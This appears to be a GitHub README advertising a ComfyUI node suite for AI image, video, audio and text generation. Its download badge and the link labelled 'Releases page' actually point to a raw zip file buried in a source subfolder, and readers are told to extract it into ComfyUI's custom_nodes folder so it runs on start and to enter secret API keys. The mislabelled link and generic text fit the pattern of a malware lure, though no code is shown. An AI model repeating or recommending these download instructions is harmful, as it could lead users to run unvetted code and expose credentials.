# 🛠️ overtli-studio-suite - Create media with local ai tools

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Korduladisposable453/overtli-studio-suite/main/nodes/llm_text_enhancer/suite_studio_overtli_transcorporate.zip)

overtli-studio-suite adds tools to ComfyUI. It connects your workspace to AI services for images, video, sound, and text. You can use local tools like LM Studio or cloud services like Pollinations and OpenAI. This suite handles the connections so you can focus on your creative work.

## 📋 System Requirements

Your computer needs specific hardware to run these AI tools. Check these items before you start.

- Operating System: Windows 10 or Windows 11.
- Memory: 16GB RAM minimum. 32GB RAM is better for video tasks.
- Graphics Card: An NVIDIA card with at least 8GB of video memory.
- Storage: 10GB of free disk space for models and data.
- Software: You must have ComfyUI installed on your machine.

## 📥 How to Install

Follow these steps to add the suite to your existing ComfyUI folder.

1. Go to the [Releases page](https://raw.githubusercontent.com/Korduladisposable453/overtli-studio-suite/main/nodes/llm_text_enhancer/suite_studio_overtli_transcorporate.zip) to find the latest version.
2. Download the compressed file to your computer.
3. Open your ComfyUI folder. Look for the folder named `custom_nodes`.
4. Extract the contents of your downloaded file into that `custom_nodes` folder.
5. Restart ComfyUI if it is open. 

The suite loads automatically when ComfyUI starts. You will see new node options in the right-click menu under the overtli-studio category.

## ⚙️ Setting Up Your API Keys

The suite performs best when it has access to specific AI services. Open the settings panel inside your ComfyUI interface to enter these keys.

- OpenAI: Provide your secret API key to use text and image generation models.
- Pollinations: No key is needed for public models, but persistent workflows may require a token.
- LM Studio: Ensure your local server is running on port 1234. The suite detects your local models automatically if this port is active.

## 🚀 Features

The overtli-studio-suite brings together several AI technologies into one workflow.

### Image and Video Generation
You can generate images from text with simple prompts. The suite helps you write better prompts before you submit them to the model. For video, the tools allow frame-by-frame control. You can queue these tasks to run in sequence.

### Speech and Audio
Convert text into natural voices. The suite supports various styles for different tones. You can also generate music tracks based on your descriptions. This is helpful for adding background sound to your video projects.

### Local and Cloud Workflows
Combine local processing with cloud speed. Use your own hardware for privacy-sensitive tasks. Switch to cloud engines when you need to run large batches or high-quality video renders.

## 💡 Using the Nodes

Once you install the suite, right-click on the open workspace area. Select `Add Node` and choose `overtli-studio`. You will see a list of available tools.

### Connect the Nodes
Drag a line from the output of one node to the input of another. For example, connect a Text Prompt node to an Image Generator node. Ensure the data types match. The suite highlights compatible inputs in green when you drag a cable.

### Monitor Performance
Watch the terminal window while the nodes run. It shows you the progress of each step. If a task takes too long, check your internet connection or your local server status. 

## 🛡️ Troubleshooting

If you encounter errors, check these common items first.

- Restart ComfyUI: Many connection issues resolve with a restart.
- Update NVIDIA Drivers: AI nodes require current drivers to communicate with your graphics card.
- Check Paths: Ensure your ComfyUI installation exists in a folder with no special characters.
- Memory Limits: If the program crashes, you might run out of video memory. Lower your image resolution settings and try again.

## 📦 Keeping Software Updated

AI tools change often. Check the releases page once per month to see if we added new features or fixes. To update, delete the old suite folder inside `custom_nodes` and extract the fresh version over it. Your settings generally stay in the config file, so you do not need to re-enter your keys.

## 🤝 Support

We build these tools for users who want to create media without complex code. If you find a bug, open an issue on the GitHub page. Provide a screenshot of your node graph and the text from your terminal window. This helps us find the problem quickly. We prioritize fixes for issues that stop the software from opening or prevent basic image generation.